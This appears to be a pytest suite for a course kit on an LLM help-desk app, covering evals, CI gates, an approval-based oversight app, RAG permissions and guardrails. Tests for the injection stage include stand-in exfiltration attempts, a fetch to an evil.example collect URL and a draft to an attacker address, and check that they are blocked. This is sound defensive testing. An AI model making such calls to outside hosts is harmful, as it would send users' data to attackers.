# The beginner guide fixes: each step a learner is asked to do is possible with the kit as shipped.
import csv
import importlib.util
import json
import subprocess
import sys

import nbformat
import pytest
from nbclient import NotebookClient

from conftest import ROOT

sys.path.insert(0, str(ROOT / "evals"))
sys.path.insert(0, str(ROOT / "scripts"))
import acceptance  # noqa: E402
import run_evals  # noqa: E402

NB = ROOT / "notebooks"
WORKFLOW = ROOT / ".github" / "workflows" / "evals.yml.example"


def run_nb(name, out, monkeypatch, **env):
    monkeypatch.setenv("KIT_OUTPUT_DIR", str(out))
    for k, v in env.items():
        monkeypatch.setenv(k, str(v))
    nb = nbformat.read(NB / name, as_version=4)
    NotebookClient(nb, timeout=300, kernel_name="python3", resources={"metadata": {"path": str(NB)}}).execute()
    return nb


def outputs(nb):
    return "\n".join(o.get("text") or o.get("data", {}).get("text/plain", "")
                     for cell in nb.cells for o in cell.get("outputs", []))


def load_module(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# 1. Stage 1 first calls answer over the help pages
def test_first_calls_put_the_help_pages_in_the_system_prompt(tmp_path, monkeypatch):
    nb = run_nb("01_first_calls.ipynb", tmp_path, monkeypatch)
    step3 = next(c.source for c in nb.cells if c.cell_type == "code" and "SYSTEM =" in c.source)
    for name in ["SYSTEM", "TEMPERATURE", "MAX_OUTPUT_TOKENS", "TRUNCATE_CAP", "MODEL", "QUESTIONS", "CAPS"]:
        assert f"{name} =" in step3
    assert "corpus" in step3 and "Answer only from the help pages" in step3 and "page id" in step3
    assert "12 help pages in the system prompt" in outputs(nb)  # public and team pages, never admin ones
    usage = list(csv.DictReader(open(tmp_path / "usage.csv")))
    assert len(usage) == 10 and all(2000 < int(r["input_tokens"]) < 6000 for r in usage)  # pages sent, kept small
    assert "MAX" in usage[-1]["stop_reason"].upper()  # call 10 still truncated


# 2. Stage 2 finds probe_runs.csv in more places and says which one it used
def test_traces_notebook_says_where_probe_runs_came_from(tmp_path, monkeypatch):
    empty = tmp_path / "empty"
    empty.mkdir()
    nb = run_nb("02_traces_pandas.ipynb", tmp_path / "out1", monkeypatch, KIT_STAGE1_DIR=empty)
    text = outputs(nb)
    assert "No Stage 1 probe_runs.csv found" in text and str(ROOT.parent) in text and str(ROOT / "stage-01") in text

    stage1 = tmp_path / "s1"
    stage1.mkdir()
    with open(stage1 / "probe_runs.csv", "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["probe_id", "model", "check_type", "run", "text", "passed"])
        w.writerow(["p01", "m1", "valid_json", 1, "not json", False])
        w.writerow(["p01", "m1", "valid_json", 2, "{}", True])
    nb = run_nb("02_traces_pandas.ipynb", tmp_path / "out2", monkeypatch, KIT_STAGE1_DIR=stage1)
    assert f"Using Stage 1 probe runs from: {stage1 / 'probe_runs.csv'}" in outputs(nb)


# 3. acceptance cases without an id
def test_acceptance_case_without_id_does_not_crash():
    rows = acceptance.run([{"question": "How do I export a note as PDF?"}, {"id": "x", "question": "zzzz"}],
                          lambda q: {"text": "ok", "cited": []})
    assert [r["id"] for r in rows] == ["case-01", "x"]


# 4. the folders the briefs write into exist on main
@pytest.mark.parametrize("folder", ["stage-06/traces", "stage-10/traces", "stage-11/notebooks", "stage-11/leak-test",
                                    "stage-12/results", "stage-13/injected-docs"])
def test_stage_folders_exist(folder):
    assert (ROOT / folder / ".gitkeep").exists()


# 5. the shipped prompts/APPROVALS.md passes --check-prompts on a fresh fork
def test_shipped_approvals_pass_and_only_for_the_kit_prompt(tmp_path):
    files, problems = run_evals.check_prompts()
    assert [p.name for p in files] == ["help_v1.md"] and problems == []
    assert "kit-baseline" in (ROOT / "prompts" / "APPROVALS.md").read_text()
    prompts = tmp_path / "prompts"
    prompts.mkdir()
    (prompts / "APPROVALS.md").write_bytes((ROOT / "prompts" / "APPROVALS.md").read_bytes())
    (prompts / "help_v1.md").write_text("A changed prompt.")
    problems = run_evals.check_prompts(prompts, tmp_path / "runs")[1]
    assert len(problems) == 1 and "kit-baseline" in problems[0] and "--save" in problems[0]


# 6. a pass bar, and a workflow a fresh fork can pass
def test_bar_sets_the_gate(tmp_path, monkeypatch):
    monkeypatch.setattr(run_evals, "RUNS", tmp_path / "runs")
    real = run_evals.app_ask
    bad = {"How do I export a note as PDF?", "How do I create a note and rename it?"}  # 2 of 20 fail
    monkeypatch.setattr(run_evals, "app_ask", lambda q: {"text": "", "cited": []} if q in bad else real(q))
    monkeypatch.delenv("EVAL_BAR", raising=False)
    assert run_evals.main([]) == 0  # default bar 0.85: 18 of 20 is enough
    monkeypatch.setenv("EVAL_BAR", "1")
    assert run_evals.main([]) == 1  # EVAL_BAR=1: every case must pass
    monkeypatch.delenv("EVAL_BAR")
    assert run_evals.main(["--bar", "0.85", "--save"]) == 0  # 18 of 20 is over 85%
    assert run_evals.main(["--bar", "0.95"]) == 1
    rec = json.loads(next((tmp_path / "runs").glob("*.json")).read_text())
    assert rec["passed"] and rec["bar"] == 0.85 and rec["pass_rate"] == 0.9
    with pytest.raises(SystemExit):
        run_evals.main(["--bar", "85"])


def test_workflow_template_is_passable_as_shipped(tmp_path):
    import yaml
    flow = yaml.safe_load(WORKFLOW.read_text())
    triggers = flow[True] if True in flow else flow["on"]  # YAML 1.1 reads the key "on" as True
    assert "pull_request" in triggers and triggers["push"]["branches"] == ["main"]
    job = flow["jobs"]["golden-set"]
    bar = float(job["env"]["EVAL_BAR"])
    assert 0 < bar < 1 and int(job["env"]["PROMPTFOO_PASS_RATE_THRESHOLD"]) == round(bar * 100)
    steps = {s.get("name", ""): s for s in job["steps"]}
    golden = next(s for n, s in steps.items() if n.startswith("Golden set, pytest"))
    assert '--bar "$EVAL_BAR"' in golden["run"]
    retrieval = next(s for n, s in steps.items() if "Stage 9" in n)
    assert retrieval["env"]["KIT_OFFLINE"] == "1"
    spanish = next(s for n, s in steps.items() if "Stage 12" in n)
    assert not (ROOT / "stage-12" / "golden-set.jsonl").exists()  # a fresh fork has not done Stage 12
    out = subprocess.run(["bash", "-e", "-c", spanish["run"]], cwd=ROOT, capture_output=True, text=True)
    assert out.returncode == 0 and "Skipping the Spanish golden set" in out.stdout
    takehome = (ROOT / "templates" / "TAKEHOME.md").read_text()
    assert "17 of 20" in takehome and "--bar 0.85" in takehome and bar == 0.85


def test_retrieval_step_passes_offline_on_a_fresh_fork(tmp_path):
    out = subprocess.run([sys.executable, str(ROOT / "evals" / "retrieval_check.py"), "--out", str(tmp_path)],
                         cwd=ROOT, capture_output=True, text=True, env={"PATH": "/usr/bin:/bin", "KIT_OFFLINE": "1"})
    assert out.returncode == 0, out.stdout + out.stderr


# 7. a saved run keeps what a learner needs to hand label it
def test_saved_run_keeps_question_reference_and_answer(tmp_path, monkeypatch):
    monkeypatch.setattr(run_evals, "RUNS", tmp_path / "runs")
    assert run_evals.main(["--split", "dev", "--save"]) == 0
    rec = json.loads(next((tmp_path / "runs").glob("*.json")).read_text())
    assert {"run_id", "passed", "by_split", "failed_cases", "prompt_sha256"} <= set(rec)  # the old fields stay
    detail = rec["cases_detail"]
    assert len(detail) == rec["cases"] == 10
    golden = {c["description"]: c["vars"] for c in run_evals.load_cases()}
    for row in detail:
        assert row["question"] == golden[row["case"]]["question"]
        assert row["reference"] == golden[row["case"]]["reference"] and row["answer"]
        assert "label" in row


# 8. the Stage 7 oversight app
@pytest.fixture
def oversight(tmp_path, monkeypatch):
    from streamlit.testing.v1 import AppTest
    monkeypatch.setenv("STAGE07_LOG_DIR", str(tmp_path))
    return lambda: AppTest.from_file(str(ROOT / "stage-07" / "oversight_app.py"), default_timeout=60).run()


def test_oversight_clears_the_question_and_offers_the_outbox(oversight, tmp_path):
    from kit import approval
    at = oversight()
    at.text_input[0].set_value(approval.SUGGESTED_PROMPTS[2]).run()
    next(b for b in at.button if b.label == "Approve").click().run()
    assert at.success and "Approved" in at.success[0].value
    assert at.text_input[0].value == ""  # the box is empty, so it does not draft again
    assert [b.label for b in at.button] == approval.SUGGESTED_PROMPTS  # back at the empty state
    assert len((tmp_path / "outbox.jsonl").read_text().splitlines()) == 1
    assert "Download outbox.jsonl" in [b.label for b in at.sidebar.get("download_button")]
    at.text_input[0].set_value(approval.SUGGESTED_PROMPTS[2]).run()
    next(b for b in at.button if b.label == "Reject").click().run()
    assert at.text_input[0].value == "" and len((tmp_path / "outbox.jsonl").read_text().splitlines()) == 1


def test_oversight_feedback_attaches_to_the_shown_answer(oversight, tmp_path, monkeypatch):
    import app.app
    calls = []
    real = app.app.answer

    def changing_answer(question, *a, **k):  # like a live model: a new wording on every call
        calls.append(question)
        r = real(question, *a, **k)
        return dict(r, text=f"{r['text']} (wording {len(calls)})")

    monkeypatch.setattr(app.app, "answer", changing_answer)
    at = oversight()
    at.text_input[0].set_value("How do I export a note as PDF?").run()
    shown = next(c.value for c in at.caption if c.value.startswith("Answer id:"))
    next(b for b in at.button if b.label == "Thumbs down").click().run()
    assert calls == ["How do I export a note as PDF?"]  # no new model call on the rerun
    row = json.loads((tmp_path / "feedback.jsonl").read_text().splitlines()[0])
    assert shown == f"Answer id: {row['answer_id']}" and row["answer"].endswith("(wording 1)")


# 9. a real tool handler with the host allowlist, and the Stage 11 answer file
def test_app_fetch_url_blocks_and_logs_other_hosts(tmp_path, monkeypatch):
    from app import tools
    monkeypatch.setattr(tools.ALLOWLIST, "log_path", tmp_path / "blocked_calls.jsonl")
    assert tools.BLOCKED_LOG == ROOT / "stage-13" / "blocked_calls.jsonl"
    ok = tools.fetch_url("https://help.quillnote.example/qn-02")
    assert "PDF" in ok["text"]
    blocked = tools.fetch_url("https://evil.example/collect?q=sync")
    assert blocked["blocked"] and blocked["host"] == "evil.example"
    log = [json.loads(x) for x in (tmp_path / "blocked_calls.jsonl").read_text().splitlines()]
    assert len(log) == 1 and log[0]["tool"] == "fetch_url" and log[0]["host"] == "evil.example"
    assert "app/tools.py" in (ROOT / "stage-13" / "README.md").read_text()


class FakeIndex:
    def search(self, question, k=3, role=None):
        return [({"id": "nw-01#0", "page_id": "nw-01", "text": "Book a lesson from the calendar."}, 1.0)]


def test_stage11_answer_file_drives_the_notebook(monkeypatch):
    mod = load_module("stage11_answer_test", ROOT / "stage-11" / "answer.py")
    logged = []
    text, cited, retrieved = mod.answer("How do I book?", "student", FakeIndex(), audit=lambda *a: logged.append(a))
    assert retrieved == ["nw-01"] and len(logged) == 1
    monkeypatch.setattr(mod, "answer", lambda *a, **k: ("I do not know.", set(), ["nw-01"]))
    assert mod.answer_with_support("Gift card?", "student", FakeIndex())[0].endswith(mod.SUPPORT_LINE)
    nb = nbformat.read(NB / "11_customer_deployment.ipynb", as_version=4)
    code = "\n".join(c.source for c in nb.cells if c.cell_type == "code")
    assert 'ROOT / "stage-11" / "answer.py"' in code and "stage11.answer_with_support(" in code
    assert "SYSTEM = (" not in code and "SUPPORT_LINE = " not in code  # no second copy in the notebook


# 10. a light requirements file for Streamlit Cloud, and the MCP Inspector proxy port
def test_app_requirements_are_light_and_cover_the_app_imports():
    names = {line.split("==")[0].lower() for line in (ROOT / "app" / "requirements.txt").read_text().splitlines()
             if line.strip() and not line.startswith("#")}
    assert {"streamlit", "google-genai", "openai", "mcp"} <= names
    assert not names & {"torch", "sentence-transformers", "transformers", "pandas", "duckdb"}
    assert "app/requirements.txt" in (ROOT / "app" / "README.md").read_text()
    assert "6277" in (ROOT / ".devcontainer" / "devcontainer.json").read_text()


# 11. Stage 12: the CI step is kept, not added
def test_stage12_readme_says_the_ci_step_exists():
    text = (ROOT / "stage-12" / "README.md").read_text()
    assert "already has the Spanish step" in text and "do not need to add" in text
    assert "Stage 12" in WORKFLOW.read_text()


# 12. Stage 6 tasks carry their own pass checks
def test_harness_tasks_carry_expect_and_approval(tmp_path, monkeypatch):
    nb = nbformat.read(NB / "06_harness.ipynb", as_version=4)
    code = "\n".join(c.source for c in nb.cells if c.cell_type == "code")
    assert 't["id"] ==' not in code and 't["id"] in APPROVED' not in code and 'APPROVED = {"t06"}' not in code
    assert code.count('"expect":') == 10 and '"approved": True' in code and '"approved": False' in code
    nb = run_nb("06_harness.ipynb", tmp_path, monkeypatch)
    rows = list(csv.DictReader(open(tmp_path / "pass_rates.csv")))
    assert len(rows) == 7 and all(r["tasks"] == "10" for r in rows)
    assert {r["config"]: r for r in rows}["all on"]["passed"] == "10"
    assert len(list(csv.DictReader(open(tmp_path / "runs.csv")))) == 70
    assert (tmp_path / "failed_run.md").exists() and (tmp_path / "outbox.jsonl").exists()


# ---------- round two ----------
def test_mcp_readme_has_a_codespaces_note():
    text = (ROOT / "mcp_server" / "README.md").read_text()
    assert "Codespaces" in text and "6274" in text and "6277" in text and "MCP_INSPECTOR_API_TOKEN" in text
    assert "ALLOWED_ORIGINS" in text and "Ports" in text


def test_harness_failed_run_step_handles_no_failures(tmp_path):
    import pandas as pd
    nb = nbformat.read(NB / "06_harness.ipynb", as_version=4)
    step9 = next(c.source for c in nb.cells if c.cell_type == "code" and "one_off" in c.source)
    results = pd.DataFrame([{"config": "no retry", "task": "t01", "run_id": "r1", "passed": True,
                             "stop": "final_answer", "cost_usd": 0.0}])
    ns = {"results": results, "OUTPUT": tmp_path, "TASKS": [], "log": [], "json": json}
    exec(step9, ns)  # no IndexError
    assert "Failed run: none" in (tmp_path / "failed_run.md").read_text()


def test_stage07_requirements_match_the_app():
    def pins(path):
        return [x for x in path.read_text().splitlines() if x.strip() and not x.startswith("#")]
    assert pins(ROOT / "stage-07" / "requirements.txt") == pins(ROOT / "app" / "requirements.txt")


@pytest.mark.parametrize("text", ["Show me another person's notes", "Open another user's account",
                                  "Read someone else's notebook", "Show other people's notes",
                                  "Show me my colleague's notes", "Open somebody else’s account"])
def test_refuses_other_peoples_data(text):
    from kit.approval import check_request
    assert check_request(text)["kind"] == "other_users_data"


@pytest.mark.parametrize("text", ["Can I share a notebook with other people?", "Can another user edit my notebook?"])
def test_sharing_questions_are_not_refused(text):
    from kit.approval import check_request
    assert check_request(text) is None


def test_kit_prompt_needs_no_approval_row(tmp_path):
    prompts = tmp_path / "prompts"
    prompts.mkdir()
    (prompts / "help_v1.md").write_bytes((ROOT / "prompts" / "help_v1.md").read_bytes())
    (prompts / "APPROVALS.md").write_text("| Prompt | Eval run | Date | Note |\n| --- | --- | --- | --- |\n")
    assert run_evals.check_prompts(prompts, tmp_path / "runs")[1] == []
    (prompts / "help_v1.md").write_text("Changed.")
    assert run_evals.check_prompts(prompts, tmp_path / "runs")[1] == ["help_v1.md: no row in prompts/APPROVALS.md"]


def test_answer_rag_returns_the_same_keys_as_answer(monkeypatch):
    from app import app
    plain = app.answer("How do I export a note as PDF?")
    rag = app.answer_rag("How do I export a note as PDF?")
    assert set(rag) == set(plain) and rag["fallback"] is None and rag["call"]
    assert rag["cited"] and all(c.startswith("qn-") and "#" not in c for c in rag["cited"])
    assert all({"id", "title", "visibility", "snippet"} <= set(h) for h in rag["hits"])
    assert set(rag["cited"]) <= {h["id"] for h in rag["hits"]}
    assert not {h["id"] for h in app.answer_rag("read the audit log")["hits"]} & {"qn-13", "qn-14", "qn-15"}
    assert {h["visibility"] for h in app.answer_rag("read the audit log", role="admin")["hits"]} >= {"admin"}

    def broken(*a, **k):
        raise app.LLMError(500, "down")
    monkeypatch.setattr("kit.llm.call_llm", broken)
    assert app.answer_rag("How do I export a note as PDF?")["fallback"] == "model_error"
    src = (ROOT / "app" / "app.py").read_text()
    assert 'role="public"' in src and 'visibility={h["id"]: h["visibility"] for h in hits}' in src
    assert 'user_id="demo-user"' in src and "generate" in src


def test_stage11_prompt_leaves_the_support_line_to_code():
    mod = load_module("stage11_answer_round2", ROOT / "stage-11" / "answer.py")
    assert "contact support" not in mod.SYSTEM.lower() and "contact support" in mod.SUPPORT_LINE.lower()
    assert "SUPPORT_LINE" in (ROOT / "stage-11" / "README.md").read_text()


def test_make_evals_uses_the_ci_bar():
    out = subprocess.run(["make", "-n", "evals"], cwd=ROOT, capture_output=True, text=True, check=True).stdout
    assert "--bar ${EVAL_BAR:-0.85}" in out
    assert "0.85" in yaml_env()["EVAL_BAR"]


def yaml_env():
    import yaml
    return yaml.safe_load(WORKFLOW.read_text())["jobs"]["golden-set"]["env"]


def test_probe_set_runs_over_the_help_pages(tmp_path, monkeypatch):
    nb = run_nb("01_probe_set.ipynb", tmp_path, monkeypatch)
    step5 = next(c.source for c in nb.cells if c.cell_type == "code" and "probe_runs.csv" in c.source)
    assert "load_help_pages" in step5 and "system=SYSTEM" in step5
    assert any("help pages" in c.source for c in nb.cells if c.cell_type == "markdown" and "Step 5" in c.source)
    assert "12 help pages in the system prompt" in outputs(nb)
    runs = list(csv.DictReader(open(tmp_path / "probe_runs.csv")))
    assert len(runs) == 100 and all(int(r["input_tokens"]) > 2000 for r in runs)


# ---------- round three ----------
def test_light_requirements_have_rag_packages_and_rag_falls_back(monkeypatch, capsys):
    for rel in ["app/requirements.txt", "stage-07/requirements.txt"]:
        text = (ROOT / rel).read_text()
        assert "numpy==2.4.6" in text and "rank_bm25==0.2.2" in text and "torch" not in text.replace("no torch", "")
    from kit import rag
    monkeypatch.delenv("KIT_OFFLINE", raising=False)
    monkeypatch.delenv("KIT_EMBEDDER", raising=False)
    monkeypatch.setitem(sys.modules, "sentence_transformers", None)  # as if it were not installed
    emb = rag.get_embedder()
    assert isinstance(emb, rag.HashEmbedder) and "hash embedder" in capsys.readouterr().out


def test_every_notebook_clones_a_branch():
    for path in sorted(NB.glob("*.ipynb")):
        setup = nbformat.read(path, as_version=4).cells[2].source
        assert 'BRANCH = "main"' in setup and '"git", "clone", "-b", BRANCH, REPO_URL' in setup, path.name


def test_draft_issue_needs_approval(tmp_path):
    from app import tools
    out, held = tmp_path / "outbox.jsonl", tmp_path / "held.jsonl"
    assert tools.draft_issue("t", "b", outbox=out, held_log=held)["denied"] and not out.exists()
    assert tools.draft_issue("t", "b", approved="yes", outbox=out, held_log=held)["denied"]  # only True counts
    assert tools.draft_issue("t", "b", approved=True, outbox=out, held_log=held)["saved"]
    assert len(out.read_text().splitlines()) == 1 and len(held.read_text().splitlines()) == 2
    table = (ROOT / "stage-13" / "authority-table.md").read_text()
    assert all(f"| {t} |" in table for t in ["search_docs", "fetch_url", "draft_issue"])


def test_injection_notebook_keeps_a_shipped_authority_table(tmp_path, monkeypatch):
    (tmp_path / "authority-table.md").write_text("# Authority table\n\nmine\n")
    run_nb("13_injection_and_redteam.ipynb", tmp_path, monkeypatch)
    assert (tmp_path / "authority-table.md").read_text() == "# Authority table\n\nmine\n"


def test_guarded_answer_always_has_a_fallback_key():
    from kit.guardrails import RateLimiter, guarded_answer
    good = lambda q: {"text": "Choose Export [qn-02].", "cited": ["qn-02"], "call": None, "fallback": None}  # noqa: E731
    ok = lambda q: (True, "", None)  # noqa: E731
    vis = {"qn-02": "public"}
    shown = guarded_answer("pdf?", "u", good, ok, visibility=vis)
    assert shown["status"] == "answered" and shown["fallback"] is None
    assert guarded_answer("pdf?", "u", good, ok)["fallback"] == "refused_output"  # unknown page: treated as admin
    assert guarded_answer("pdf?", "u", good, lambda q: (False, "off topic", None))["fallback"] == "refused_input"
    limiter = RateLimiter(0, 60)
    assert guarded_answer("pdf?", "u", good, ok, limiter=limiter)["fallback"] == "rate_limited"
    nopage = lambda q: {"text": "No help page matches.", "cited": [], "call": None, "fallback": "no_page"}  # noqa: E731
    assert guarded_answer("zzzz", "u", nopage, ok)["fallback"] in ("no_page", "refused_output")


def test_labels_out_writes_a_csv_to_label(tmp_path, monkeypatch):
    monkeypatch.delenv("EVAL_BAR", raising=False)
    out = tmp_path / "to_label.csv"
    assert run_evals.main(["--split", "regression", "--labels-out", str(out)]) == 0
    rows = list(csv.DictReader(open(out)))
    with open(ROOT / "evals" / "labels.csv") as f:
        assert list(rows[0]) == next(csv.reader(f))  # the columns 08_judge_calibration reads
    assert len(rows) == 4 and all(r["question"] and r["answer"] and r["human_label"] == r["note"] == "" for r in rows)
    assert "EVAL_BAR" in (ROOT / "prompts" / "APPROVALS.md").read_text()


# ---------- round four ----------
def test_09_notebooks_read_the_ci_questions(tmp_path, monkeypatch):
    for name in ["09_rag_pipeline", "09_retrieval_eval", "09_permissions"]:
        code = "\n".join(c.source for c in nbformat.read(NB / f"{name}.ipynb", as_version=4).cells
                         if c.cell_type == "code")
        assert 'ROOT / "evals" / "retrieval_questions.jsonl"' in code and 'CORPUS / "questions.jsonl"' in code, name
    nb = run_nb("09_retrieval_eval.ipynb", tmp_path, monkeypatch)
    assert "Labeled questions from: evals/retrieval_questions.jsonl" in outputs(nb)


def test_redteam_notebook_defends_with_repo_code():
    code = "\n".join(c.source for c in nbformat.read(NB / "13_injection_and_redteam.ipynb", as_version=4).cells
                     if c.cell_type == "code")
    assert "from app import tools as app_tools" in code and "app_tools.approval_gate(" in code
    assert "app_tools.make_fetch_url(" in code and "HostAllowlist({" not in code and "def require_approval" not in code
    assert "input_rules(task)" in code and "output_check(" in code
    assert "kit/guardrails.py" in (ROOT / "stage-13" / "README.md").read_text()


def test_approval_gate_and_fetch_factory(tmp_path):
    from app import tools
    held, out = [], tmp_path / "outbox.jsonl"
    gate = tools.approval_gate("Draft an issue titled X", outbox=out, held_log=tmp_path / "held.jsonl",
                               extra=lambda: {"run": "r1"}, on_held=held.append)
    assert gate("X", "body")["saved"] and json.loads(out.read_text())["run"] == "r1"
    assert gate("X", "body", to="attacker@evil.example")["denied"] and held[0]["to"] == "attacker@evil.example"
    assert tools.approval_gate("How do I export?", outbox=out, held_log=tmp_path / "h.jsonl")("X", "b")["denied"]
    seen = []
    fetch = tools.make_fetch_url(log_path=tmp_path / "blocked.jsonl", on_fetch=seen.append)
    assert fetch("https://evil.example/x")["blocked"] and fetch.allowlist.blocked and not seen
    assert "PDF" in fetch("https://help.quillnote.example/qn-02")["text"] and len(seen) == 1


def test_guarded_answer_always_has_cited():
    from kit.guardrails import RateLimiter, guarded_answer
    good = lambda q: {"text": "Choose Export [qn-02].", "cited": ["qn-02"], "call": None}  # noqa: E731
    ok = lambda q: (True, "", None)  # noqa: E731
    assert guarded_answer("pdf?", "u", good, ok, visibility={"qn-02": "public"})["cited"] == ["qn-02"]
    assert guarded_answer("pdf?", "u", good, lambda q: (False, "x", None))["cited"] == []
    assert guarded_answer("pdf?", "u", good, ok, limiter=RateLimiter(0, 60))["cited"] == []
